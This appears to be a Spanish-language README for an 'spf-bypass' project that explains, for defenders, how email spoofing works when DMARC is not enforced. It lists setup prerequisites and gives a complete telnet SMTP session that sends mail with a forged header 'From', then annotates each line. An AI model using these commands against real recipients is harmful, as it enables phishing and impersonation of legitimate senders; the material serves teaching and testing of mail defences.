# spf-bypass

Consulte este blog para obtener una descripción general de las técnicas de suplantación de correo electrónico o este blog para comprender los tipos de infraestructura necesarios para enviar correos electrónicos de phishing realistas .

Este proyecto tiene como objetivo educar a los defensores y demostrar la facilidad con la que los actores de amenazas pueden abusar de dominios inseguros para la entrega de correo electrónico falsificado. Utilizando una deficiencia de seguridad conocida como derivación de SPF, los actores de amenazas pueden enviar correos electrónicos que no proporcionan indicios de intenciones maliciosas y pueden engañar a los profesionales de seguridad más experimentados.

Consulte https://dmarc.org/wiki/FAQ para obtener una descripción detallada de los protocolos de autenticación de correo electrónico (es decir, SPF, DKIM y DMARC). Consulte a continuación una descripción detallada de cómo los spammers profesionales evitan SPF cuando DMARC no se ha configurado en una configuración reforzada.

Requisitos previos para entregar correctamente correo falsificado (utilizando técnicas de omisión de SPF):

    Un dominio que usted controla (coste aproximado de $12-15 AUD/año; consulte https://au.godaddy.com/ )
    Un servidor o VPN con una IP pública dedicada que no haya bloqueado el tráfico saliente a través del puerto 25 (aprox. $80-150 AUD/año)
    Configure el archivo de zona DNS TXT para el dominio comprado, para incluir la IP pública del servidor o VPN en su registro SPF público (consulte https://au.godaddy.com/help/add-an-spf-record-19218 )

Al completar los 3 pasos anteriores, podrá demostrar con éxito la entrega de correo falsificado utilizando técnicas de omisión de SPF.

Para realizar un ataque de omisión de SPF, simplemente ejecute los siguientes comandos de telnet que se pueden ejecutar en cualquier terminal de Windows o Linux. Reemplace <target.mailserver.com> con el servidor de correo de destino al que está entregando el correo electrónico falsificado (es decir, el destinatario; busque el registro MX del dominio del destinatario para identificarlo), reemplace atacante@attackerdomain.com con el dominio que adquirió y configure antes, reemplace Legitimate_Sender@spoofed.com con la dirección y el dominio que está falsificando y reemplace target@target.com.au con su destinatario objetivo.


    telnet target.mailserver.com 25
    helo attackerdomain.com
    mail from: attacker@attackerdomain.com
    rcpt to: target@target.com.au
    data
    from: "Sender, Legitimate" <Legitimate_Sender@spoofed.com>
    to: target@target.com.au
    subject: Presentation - Email Demo
    This is a test

    .

De lo que estamos abusando aquí es de una debilidad en la forma en que se entregan, autentican y presentan los correos electrónicos en la pantalla de los usuarios. Si desglosamos cada componente de la entrega de correo anterior, podemos ver cómo la omisión de SPF abusa de una desalineación de dominio entre el sobre de correo 'SMTP.MailFrom' y el encabezado de correo 'From':


    telnet target.mailserver.com 25 
    helo attackerdomain.com <--- If the SMTP.MailFrom is empty (row below), SPF authentication instead relies on the SMTP.helo
    mail from: attacker@attackerdomain.com <-- This is where SPF checks are typically performed. If we mis-align this to the Mail Header 'From' we can trick the recipient
    rcpt to: target@target.com.au
    data <--- Everything from here down is presented to the user in the traditional email format. Everything above is hidden from the user as the Mail Envelope
    from: "Sender, Legitimate" <Legitimate_Sender@spoofed.com> <--- This is where SPF-bypass occurs - DMARC protects against this by performing an alignment check betwen both 'From' values
    to: target@target.com.au
    subject: Presentation - Email Demo
    This is a test
    
    .
